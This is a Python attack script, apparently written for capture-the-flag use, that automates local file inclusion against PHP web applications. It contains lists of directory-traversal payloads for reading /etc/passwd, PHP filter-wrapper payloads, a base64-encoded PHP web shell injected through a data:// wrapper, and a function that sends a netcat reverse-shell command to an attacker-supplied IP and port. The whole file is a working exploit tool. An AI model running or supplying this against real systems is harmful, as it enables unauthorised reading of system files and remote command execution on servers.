#!/usr/bin/python
import urllib.parse
import requests
from bs4 import BeautifulSoup
import time
"""
Created by: Ap3ili
Purpose: This script is mainly for CTFs, nothing more.
"""
basic_payloads = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "..//..//..//etc/passwd",
        "..//..//..//..//etc/passwd",
        "..//..//..//..//..//etc/passwd",
        "..//..//..//..//..//..//etc/passwd",
        "..//..//..//..//..//..//..//etc/passwd",
        "..//..//..//..//..//..//..//..//etc/passwd",
        "../../../etc/passwd%00",
        "../../../../etc/passwd%00",
        "../../../../../etc/passwd%00",
        "../../../../../../etc/passwd%00",
        "../../../../../../../etc/passwd%00",
        "../../../../../../../../etc/passwd%00",
        "....//....//....//etc/passwd",
        "....//....//....//....//etc/passwd",
        "....//....//....//....//....//etc/passwd",
        "....//....//....//....//....//....//etc/passwd",
        "....//....//....//....//....//....//....//etc/passwd",
        "....//....//....//....//....//....//....//....//etc/passwd",
        "....\/....\/....\/etc/passwd",
        "....\/....\/....\/....\/etc/passwd",
        "....\/....\/....\/....\/....\/etc/passwd",
        "....\/....\/....\/....\/....\/....\/etc/passwd",
        "....\/....\/....\/....\/....\/....\/....\/etc/passwd",
        "....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd",
        "....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd",
]

php_wrappers = [
        "php://filter/read=string.rot13/resource=/etc/passwd",
        "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd", 
]

remote_shell = [
"php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=cat%20/etc/passwd",
]

def get_remote_shell(target):
    attacker_ip = input("Enter your IP: ")
    attacker_port = input("Enter listener port: ")
    shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc {attacker_ip} {attacker_port} >/tmp/f"
    url_encoded = urllib.parse.quote_plus(shell, safe='')
    rce = f"php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd={url_encoded}"
    rce_url = target + rce
    response = requests.get(rce_url)

def find_root(response, target):
        if response.status_code == 200:
                soup = BeautifulSoup(response.content, 'html.parser')
                root_occurrence = soup.find_all(string=lambda text: 'root' in text)
        
                if root_occurrence:
                        print("[!]", target)
                        return True
        else:
                print("Server error")
        return False

def getURL(target, payload):
        full_url = f"{target}{payload}"
        response = requests.get(full_url)
        return response, full_url


payload_lists = [basic_payloads, php_wrappers, remote_shell]
global target
def main():
        print("Example URL: http://10.10.10.10/search.php?page=")
        target = input("Enter target: ")
        print("[+] Searching for LFI")
        for payloads in payload_lists:
                for payload in payloads:
                        response, full_url = getURL(target, payload) # attaches payload to the end the URL
                        if payloads == remote_shell and find_root(response, full_url):
                                print("RCE is possible, do you want a shell?")
                                user_shell = input("Remote shell: Y/N: ").lower()
                                if user_shell == "y":
                                        get_remote_shell(target)
                                        exit()

                        if find_root(response, full_url): # if it finds a LFI, it breaks from that list.
                                break
main()
